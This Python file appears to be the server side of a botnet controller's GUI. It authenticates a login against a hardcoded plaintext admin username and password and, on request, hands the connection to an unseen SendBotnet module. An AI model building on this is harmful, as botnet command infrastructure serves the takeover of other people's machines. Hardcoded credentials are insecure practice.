import socket
import struct
from time import sleep
from threading import Thread
import SendBotnet

#socket.gethostbyname(socket.gethostname())

class GUI():
    def __init__(self,port=2000,ip="127.0.0.1",
                admin_username="",admin_passwd=""):
        #Sets the class global variables
        self.port = port
        self.ip = ip
        self.admin_username = admin_username
        self.admin_passwd = admin_passwd
        dummy = Thread(target=self.start_dummyServer)
        dummy.start()
        self.listen_GUI()

    def start_dummyServer(self):
        dummy_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        dummy_server.bind((self.ip,int(self.port+1)))
        dummy_server.listen(2)
        while True:
            master,addr = dummy_server.accept()
            print("[*]GUI started on %s"%(str(addr[0])))
            sleep(2)
            master.close()

    def check_creds(self):
        if self.username == self.admin_username and self.passwd == self.admin_passwd:
            return True
        else:
            return False

    def listen_GUI (self):
        # Start the server to communicate with GUI
        gui_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        gui_server.bind((self.ip,self.port))
        gui_server.listen(1)
        print("[*]Server started on %s:%s"%(self.ip,self.port))

        #Listens for connection
        while True:
            try:
                master,addr = gui_server.accept()
                print("[*]GUI connection established to %s"%(str(addr[0])))
                #master.setblocking(1)

                #Receives data from the MasterController
                init_pkt = master.recv(1024)
                init_data = struct.unpack("<HH1s",init_pkt)
                req_type = init_data[2].decode()
                if req_type == 'V':
                    dataPkt = master.recv(1024)

                    #Unpacks the size of the Data
                    data_size = struct.unpack("<HH",dataPkt[:4])
                    username_size = data_size[0]
                    passwd_size = data_size[1]

                    #Unpacks the main payload
                    username = struct.unpack("<%ds"%(username_size),dataPkt[4:(username_size+4)])
                    username = username[0].decode()
                    passwd = struct.unpack("<%ds"%(passwd_size),dataPkt[(username_size+4):])
                    passwd = passwd[0].decode()
                    self.username = username
                    self.passwd = passwd

                    #Check the details
                    if self.check_creds():
                        master.send("A".encode())
                    else:
                        master.send("I".encode())
                elif req_type == "E":
                    pass
                elif req_type == "R":
                    SendBotnet.Send(master)
            except Exception as e:
                print("[*]Error in listen : %s"%(str(e)))

GUI(admin_passwd="devesh2003",admin_username="Devesh")